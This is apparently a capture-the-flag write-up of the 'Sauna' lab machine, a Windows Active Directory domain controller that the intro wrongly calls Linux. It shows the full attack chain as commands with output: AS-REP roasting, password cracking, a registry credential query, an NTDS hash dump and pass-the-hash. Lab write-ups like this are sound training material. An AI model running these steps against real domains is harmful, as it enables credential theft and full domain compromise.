# Sauna

## Sauna

Sauna was an easy linux box that involved web enum in order to get a username and then using GetNPUsers.py to get a password. Root involved dumping hashses with a password gained from windows registry.

## USER

### enumeration

```bash
➜  sauna nmap -sC -sV -o nmap 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-15 05:12 EDT
Nmap scan report for 10.10.10.175
Host is up (0.031s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-15 16:16:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/15%Time=5F0EC87E%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We enumerate the port 80 service and look around. The `Meet the team` section on the website had a list of all the employees of the company.

### using GetNPUsers.py to get hash

We add all these people to a wordlist to enumerate further with GetNPUsers.py to see if we can get any hashes for the users.

![users-website-image](https://i.ibb.co/Q6y7Dw0/sauna-users.png)

User file:

```text
hugo
hugob
hbear
bowie
bowiet
btaylor
fergus
fsmith
ferguss
steven
stevenk
skerb
shaun
scoins
sophie
sdrivers
```

We make this by adding a bunch combinations for all the users listed on the website.

```bash
sauna /home/kali/impacket/build/scripts-3.8/GetNPUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -usersfile user.txt       
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a97bee014bf409ab302936289a30a7bd$06b617c60a8b92d950b5d96b503ee5f12e61e5dabc28c971efa57aa84a44f43c505cb8aea1583da954c6db818e2fef2094511d57bcb9682bdb8edd34d34a1379efe0f4220f88b5d70f642228e44a058a3a4ef8cfad47905976a4ec2fbccd64d3771a2fa1a336c50fa1d70be37c131224a32bb006491f4c77818033d2fe500095e04d895343897f93c4a626e4a6ef2e8462f7cedeaf0aa00406275db4b253c9c17936f1206111ddbf7b622e27c8e041d890d7a743a08e526f80c752cf10dd714706671196fe9cf6aa5a46a0aa7c4d742e6402c07dbec4cb16386f814d61daedaa647ee2a751bdfa8c76042d4a79d6575b948d3f96ed7b63028e0fdc4fab19302a
```

Doing this gives us a hash which we add to a file and decrypt with john.

### cracking hash

We run `john hash.txt -w=/home/kali/rockyou.txt` and we get the password: `Thestrokes23`

So now we have credentials for the user fsmith as seen the in GetNPUsers.py output `fsmith@EGOTISTICAL-BANK.LOCAL` and the password `Thestrokes23`.

We can now login using `evil-winrm` and read the user flag.

### user.txt

```bash
➜  sauna evil-winrm -u fsmith -p "Thestrokes23" -i 10.10.10.175 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1b552{...}
```

## ROOT

From here we attempt to enumerate further.

### registry enum

We look into trying to get creds form the registry and windows registry stores information that is used by the system or by programs, We can query the registry and find creds for the passwords that have been stored.

```bash
reg query HKLM /f password /t REG_SZ /s

-------

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

-----
```

This is a snippet from running the command showing us that we found credentials for another user.

### secretsdump.py

We can login with these creds as admin and enum further or we can attempt to dump the admin hashes with `secretsdump.py` from impacket.

This will then give us the admin hash that we login with as root.

```bash
➜  sauna python secretsdump.py egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:5f39f2581b3bbb4c79cd2a8f56e7f3427e707bd3ba518a793825060a3c4e2ef3
SAUNA$:aes128-cts-hmac-sha1-96:c628107e9db1c3cb98b1661f60615124
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

The most important line is the one at the top. `Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::`

### psexec.py as root

We then login with `psexec.py` and read the root flag.

```bash
➜  sauna python psexec.py administrator@10.10.10.175 -hashes "aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff"
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file aYjKOcec.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service tboR on 10.10.10.175.....
[*] Starting service tboR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /

C:\>cd Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

01/23/2020  04:11 PM    <DIR>          .
01/23/2020  04:11 PM    <DIR>          ..
01/23/2020  11:22 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   7,132,286,976 bytes free

C:\Users\Administrator\Desktop>type root.txt
f3ee04965c68257382e31502cc5e881f
```

Thanks for reading hope you enjoyed.

